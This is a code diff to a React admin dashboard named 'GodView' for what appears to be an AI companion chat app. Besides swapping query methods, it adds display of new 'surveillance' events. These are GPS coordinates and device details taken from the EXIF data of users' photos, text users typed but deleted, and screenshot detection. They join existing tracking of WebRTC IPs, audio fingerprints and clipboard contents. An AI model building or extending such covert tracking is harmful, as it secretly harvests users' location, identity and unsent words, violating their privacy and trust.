@@ -498,7 +498,7 @@ export default function GodView() {
               .from('user_progress')
               .select('user_id, sync_level, total_messages, intimacy_score, muse_avatar_url, muse_name, current_mode, admin_takeover, admin_takeover_at')
               .eq('user_id', newLog.user_id)
-              .single()
+              .maybeSingle()
               .then(({ data: userData, error }) => {
                 console.log('🔔 [GodView] User progress fetch result:', userData, error);
                 if (userData) {
@@ -676,7 +676,7 @@ export default function GodView() {
                 .from('user_progress')
                 .select('*')
                 .eq('user_id', userId)
-                .single();
+                .maybeSingle();
 
               if (userData) {
                 setUserProgress(prev => {
@@ -1300,7 +1300,7 @@ export default function GodView() {
           .eq('user_id', userId)
           .order('created_at', { ascending: false })
           .limit(1)
-          .single();
+          .maybeSingle();
 
         // 檢查最後一句是否有 MUSE 回應
         const lastMetadata = lastLog?.metadata as { is_muse_response?: boolean } | null;
@@ -2493,7 +2493,9 @@ export default function GodView() {
                         'CLIPBOARD', 'COPY', 'EXTERNAL_LINK', 'REFERRER', 'BATTERY', 'BATTERY_LOW',
                         'NETWORK', 'CSS_PREFS', 'RIGHT_CLICK', 'DOUBLE_CLICK', 'SHORTCUT',
                         'WEBRTC_IP', 'ORIENTATION', 'TOUCHES', 'AUDIO_FINGERPRINT', 'STORAGE',
-                        'PERFORMANCE', 'SW_REGISTERED', 'NOTIFICATION_PERMISSION', 'batch'
+                        'PERFORMANCE', 'SW_REGISTERED', 'NOTIFICATION_PERMISSION', 'batch',
+                        // 新增的監控類型
+                        'PHOTO_EXIF', 'DELETED_CONTENT', 'SCREENSHOT'
                       ];
                       if (surveillanceTypes.includes(metaType || '')) return true;
                       return false;
@@ -2719,6 +2721,47 @@ export default function GodView() {
                               const points = meta?.points as Array<unknown> | undefined;
                               icon = '👆';
                               text = points ? `觸控 ${points.length} 點` : '觸控';
+                              break;
+                            }
+                            // 📷 照片 EXIF 資料
+                            case 'PHOTO_EXIF': {
+                              icon = '📷';
+                              const exifParts: string[] = [];
+                              if (meta?.dateTimeOriginal || meta?.dateTime) {
+                                exifParts.push(`📅 ${meta.dateTimeOriginal || meta.dateTime}`);
+                              }
+                              if (meta?.gpsLatitude !== undefined && meta?.gpsLongitude !== undefined) {
+                                const lat = meta.gpsLatitude as number;
+                                const lng = meta.gpsLongitude as number;
+                                exifParts.push(`📍 ${lat.toFixed(4)}, ${lng.toFixed(4)}`);
+                              }
+                              if (meta?.make || meta?.model) {
+                                exifParts.push(`📱 ${[meta.make, meta.model].filter(Boolean).join(' ')}`);
+                              }
+                              if (meta?.software) {
+                                exifParts.push(`🖼️ ${meta.software}`);
+                              }
+                              const source = meta?.source as string;
+                              const sourceText = source === 'burning_photo' ? '焚燒照片' :
+                                                 source === 'conversation_screenshot' ? '對話截圖' : '上傳照片';
+                              text = exifParts.length > 0 ? `${sourceText}: ${exifParts.join(' | ')}` : `${sourceText}的隱藏資訊`;
+                              break;
+                            }
+                            // 🗑️ 刪除內容捕捉
+                            case 'DELETED_CONTENT': {
+                              icon = '🗑️';
+                              const deletedChars = meta?.deletedChars as string[] | undefined;
+                              const totalDeleted = deletedChars ? deletedChars.join('') : '';
+                              text = totalDeleted ? `想說但刪掉: "${totalDeleted.slice(0, 50)}${totalDeleted.length > 50 ? '...' : ''}"` : '刪除了輸入內容';
+                              break;
+                            }
+                            // 📸 截圖偵測
+                            case 'SCREENSHOT': {
+                              icon = '📸';
+                              const key = meta?.key as string;
+                              text = key === 'PrintScreen' ? '可能截圖了（PrintScreen）' :
+                                     key === '3' || key === '4' || key === '5' ? '可能截圖了（Mac 快捷鍵）' :
+                                     '可能截圖了對話';
                               break;
                             }
                             default:
